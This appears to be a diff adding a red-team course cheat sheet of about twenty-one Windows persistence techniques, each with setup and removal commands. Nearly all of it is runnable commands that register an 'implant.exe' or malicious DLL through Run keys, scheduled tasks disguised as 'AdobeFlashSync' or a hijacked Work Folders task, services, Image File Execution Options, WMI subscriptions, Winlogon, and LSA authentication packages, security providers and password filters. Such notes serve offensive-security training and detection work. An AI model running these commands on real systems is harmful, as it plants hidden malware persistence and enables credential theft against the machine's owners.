@@ -1,0 +1,305 @@
+01. Startup Folder
+setup:
+copy c:\rto\pers\implant\implant.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+removal:
+del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\implant.exe"
+
+
+
+02. Registry Run Keys
+setup:
+reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSUpdate /t REG_SZ /d c:\rto\PERS\implant\implant.exe /f
+
+removal:
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSUpdate /f
+
+
+
+03. Logon Scripts
+setup:
+reg add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "c:\RTO\PERS\01.USER\logon.bat" /t REG_SZ /f
+
+removal:
+reg delete "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /f
+
+
+
+04. Shortcut Modification
+wscript c:\rto\PERS\01.USER\makelnk.vbs
+
+
+
+05. Screensaver
+setup:
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "c:\rto\pers\implant\implant.exe" /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "10" /f
+
+removal:
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "" /f
+
+
+
+06. PowerShell Profile
+setup:
+dir %HOMEPATH%"\Documents\windowspowershell
+echo c:\rto\pers\implant\implant.exe > %HOMEPATH%"\Documents\windowspowershell\profile.ps1
+
+removal:
+del %HOMEPATH%"\Documents\windowspowershell\profile.ps1
+
+
+
+07. DLL Search Order Hijacking
+setup:
+dumpbin /imports c:\BGinfo\BGINFO.EXE
+copy c:\RTO\PERS\01.USER\DLL-hijack\winspool.drv c:\BGinfo
+copy c:\Windows\SysWOW64\winspool.drv c:\BGinfo\winsplhlp.dll
+
+removal:
+del c:\BGinfo\winspool.drv c:\BGinfo\winsplhlp.dll
+
+
+
+08. COM Hijacking
+setup:
+schtasks /query /xml > c:\RTO\PERS\01.USER\tasks.xml
+reg query "HKCR\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"
+reg query "HKCU\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"
+reg query "HKLM\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"
+
+reg export "HKLM\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" c:\rto\PERS\01.USER\tsk-orig.reg /y /reg:64
+
+reg import c:\rto\PERS\01.USER\tsk.reg /reg:64
+reg query "HKCU\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\InProcServer32" /reg:64
+
+removal:
+reg delete "HKCU\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f /reg:64
+
+
+
+09. Scheduled Task
+as a regular USER:
+setup:
+schtasks /create /tn "Mytasks\go" /sc daily /st 09:00 /tr "c:\rto\pers\implant\implant.exe"
+schtasks /query /tn "mytasks\go" /fo:list /v
+schtasks /run /tn "mytasks\go"
+
+removal:
+schtasks /delete /tn “mytasks\go” /f
+
+
+as a LOCAL ADMIN:
+setup:
+schtasks /create /sc onlogon /tn AdobeFlashSync /tr "c:\rto\pers\implant\implant.exe"
+schtasks /query /tn "AdobeFlashSync" /fo list
+
+schtasks /query /tn AdobeFlashSync /xml 
+schtasks /query /tn AdobeFlashSync /xml > c:\RTO\PERS\tsk.xml
+schtasks /delete /f /tn AdobeFlashSync
+schtasks /create /tn AdobeFlashSync /xml c:\RTO\PERS\tsk.xml
+
+removal:
+schtasks /delete /f /tn AdobeFlashSync
+
+
+
+10. Multiaction Scheduled Task
+setup:
+schtasks /query /tn  "\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization" /fo list /v
+schtasks /query /tn "\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization" /xml > c:\RTO\PERS\tsk2.xml
+schtasks /delete /tn "\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization" /f
+schtasks /create /tn "\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization" /xml c:\RTO\PERS\tsk3.xml
+schtasks /query /tn  "\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization" /fo list /v
+schtasks /run /tn "\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization"
+
+removal:
+schtasks /delete /tn "\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization" /f
+schtasks /create /tn "\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization" /xml c:\RTO\PERS\tsk2.xml
+
+
+
+11. New & Modify Existing Service
+setup:
+sc create UpdateService binpath= c:\rto\pers\implant\implantsrv.exe start= auto
+sc query UpdateService
+sc start UpdateService
+
+sc config UpdateService binpath= "c:\windows\system32\notepad.exe"
+sc stop UpdateService
+sc start UpdateService
+
+removal:
+sc delete UpdateService
+
+
+
+12. Image File Execution Options
+DEBUGGER:
+setup:
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BGINFO.EXE" /v Debugger /d "C:\rto\PERS\implant\implant.exe" /reg:32
+
+removal:
+reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BGINFO.EXE" /f /reg:32
+
+
+SILENPROCESSEXIT:
+setup:
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BGINFO.EXE" /v GlobalFlag /t REG_DWORD /d 512 /reg:32
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\BGINFO.EXE" /v MonitorProcess /d "C:\rto\PERS\implant\implant.exe" /reg:32
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\BGINFO.EXE" /v ReportingMode /t REG_DWORD /d 1 /reg:32
+
+removal:
+reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BGINFO.EXE" /f /reg:32
+reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\BGINFO.EXE" /f /reg:32
+
+
+VERIFIER:
+setup:
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BGINFO.EXE" /v VerifierDlls /d "vrf.dll" /reg:32 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BGINFO.EXE" /v GlobalFlag /t REG_DWORD /d 256 /reg:32
+copy c:\RTO\PERS\02.ADMIN\verifier\vrf.dll c:\windows\SysWOW64
+
+removal:
+del c:\windows\SysWOW64\vrf.dll
+reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BGINFO.EXE" /f /reg:32
+
+
+
+13. Application Shiming
+setup:
+sdbinst C:\RTO\PERS\02.ADMIN\bginfo.sdb
+
+removal:
+sdbinst -u C:\RTO\PERS\02.ADMIN\bginfo.sdb
+
+
+
+14. WMI Event Subscription
+querying:
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter GET /format:list
+wmic /NAMESPACE:"\\root\subscription" PATH __EventConsumer GET /format:list
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding GET /format:list
+
+setup:
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="INFilter", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="Select * From __InstanceCreationEvent Within 15 Where (TargetInstance Isa 'Win32_Process' And TargetInstance.Name = 'wordpad.exe')"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="INConsumer", WorkingDirectory="C:\rto\PERS\implant", CommandLineTemplate="c:\rto\PERS\implant\implant.exe"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"INFilter\"", Consumer="CommandLineEventConsumer.Name=\"INConsumer\""
+
+removal:
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter="__EventFilter.Name='INFilter'" DELETE
+wmic /NAMESPACE:"\\root\subscription" PATH  __EventFilter WHERE Name="INFilter" DELETE
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="INConsumer" DELETE
+
+
+
+15. AppCert DLLs
+setup:
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls" /V "AppCert" /T REG_EXPAND_SZ /D "c:\rto\pers\02.ADMIN\appcert\AppCert.dll" /F
+
+removal:
+reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls" /V "AppCert" /F
+
+
+
+16. AppInit DLLs
+setup:
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows" /V "LoadAppInit_DLLs" /T REG_DWORD /D "0x1" /F
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows" /V "AppInit_DLLs" /T REG_SZ /D "c:\rto\pers\implant\implant.dll" /F
+
+removal:
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows" /V "LoadAppInit_DLLs" /T REG_DWORD /D "0x0" /F
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows" /V "AppInit_DLLs" /T REG_SZ /D "" /F
+
+
+
+17. Netsh Helper DLL
+setup:
+netsh.exe add helper c:\RTO\PERS\02.ADMIN\nethelp\nethelp.dll
+
+removal:
+netsh.exe del helper c:\RTO\PERS\02.ADMIN\nethelp\nethelp.dll
+
+
+
+18. Winlogon
+SHELL:
+setup:
+copy c:\rto\PERS\implant\implant.exe c:\windows\system32\
+reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Shell"
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Shell" /T REG_SZ /D "explorer.exe,implant.exe" /F
+
+removal:
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Shell" /T REG_SZ /D "explorer.exe" /F
+
+
+USERINIT:
+setup:
+reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "UserInit"
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "UserInit" /T REG_SZ /D "C:\Windows\system32\userinit.exe,c:\windows\system32\implant.exe" /F
+
+removal:
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "UserInit" /T REG_SZ /D "C:\Windows\system32\userinit.exe" /F
+del c:\windows\system32\implant.exe
+
+
+
+19. Time Providers
+setup:
+copy c:\rto\PERS\02.ADMIN\timeprov\timeprov.dll c:\windows\system32
+reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\TimeProv" /t REG_EXPAND_SZ /v "DllName" /d "%systemroot%\system32\timeprov.dll" /f
+reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\TimeProv" /t REG_DWORD /v "Enabled" /d "1" /f
+reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\TimeProv" /t REG_DWORD /v "InputProvider" /d "1" /f
+
+removal:
+reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\TimeProv" /f
+del c:\windows\system32\timeprov.dll
+
+
+
+20. Port Monitors
+setup:
+copy c:\RTO\PERS\02.ADMIN\portmonit\portmon.dll c:\windows\system32\
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors\PortMonitor" /v Driver /t REG_SZ /d "portmon.dll" /f
+
+removal:
+reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors\PortMonitor" /v Driver /f
+del c:\Windows\System32\portmon.dll
+
+
+
+21. LSA/LSASS
+AUTHENTICATION PACKAGE:
+setup:
+copy c:\rto\PERS\02.ADMIN\AuthPkg\sspap.dll c:\Windows\System32\
+reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages"
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0"\0"sspap.dll" /f
+
+removal:
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f
+del c:\windows\system32\sspap.dll
+
+
+SECURITY SUPPORT PROVIDER:
+setup:
+copy c:\rto\PERS\02.ADMIN\AuthPkg\sspap.dll c:\Windows\System32\
+reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages"
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "sspap.dll" /f
+
+removal:
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "" /f
+del c:\windows\system32\sspap.dll
+
+
+PASSWORD FILTER:
+setup:
+copy c:\RTO\PERS\02.ADMIN\passfilter\passfilter.dll c:\Windows\System32\
+reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /d "scecli"\0"passfilter" /t REG_MULTI_SZ /f
+
+removal:
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /d "scecli" /t REG_MULTI_SZ /f
+del c:\windows\system32\passfilter.dll
+
+
